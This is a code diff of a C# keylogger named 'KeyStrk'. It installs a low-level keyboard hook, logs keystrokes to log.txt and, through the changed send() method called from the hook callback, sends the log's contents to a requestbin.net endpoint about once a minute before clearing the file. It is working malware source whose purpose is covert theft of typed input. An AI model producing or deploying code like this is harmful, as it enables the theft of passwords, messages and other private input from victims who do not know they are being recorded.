@@ -15,15 +15,16 @@ namespace KeyStrk
         private const int WM_KEYDOWN = 0x0100;
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
-
+        private static dataSender ds = new dataSender();
+        private static int lastSendTime = DateTime.Now.Minute;
         //Initialize wordData string used to store seprate words from user input
         private static String wordData = "";
    
 
         public static void Main()
         {
+            
 
-            dataSender dSender = new dataSender();
             //Create log file if file exists make it blank 
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
             sw.Close();
@@ -37,7 +38,7 @@ namespace KeyStrk
 
             //Set up threads
             Thread hookThread = new Thread(HookInput);
-            Thread sendData = new Thread(dSender.checkSend);
+            //Thread sendData = new Thread(dSender.checkSend);
 
             //Start threads
             hookThread.Start();
@@ -82,7 +83,16 @@ namespace KeyStrk
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                
+
+                int currentTime = DateTime.Now.Minute;
+
+                if (currentTime - lastSendTime >= 1)
+                {
+                    ds.send();
+                    lastSendTime = DateTime.Now.Minute;
+                    //Console.Out.WriteLine("Data sent !");
+                }
+
                 // Split the input in to sepate words;
                 if ((Keys)vkCode == Keys.Enter || (Keys)vkCode == Keys.Space || (Keys)vkCode == Keys.Oemcomma || (Keys)vkCode == Keys.OemPeriod)
                 {
@@ -165,10 +175,10 @@ namespace KeyStrk
         }
 
         // used for sending data over http request to a remote server
-        private void send()
+        public void send()
         {
             StreamReader sr = new StreamReader(Application.StartupPath + @"\log.txt");
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/1fmd4pf1" + sr.ReadLine());
+            HttpWebRequest req = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/1evrgmf1" + "?" + sr.ReadLine());
             sr.Close();
             StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", false);
             sw.Close();
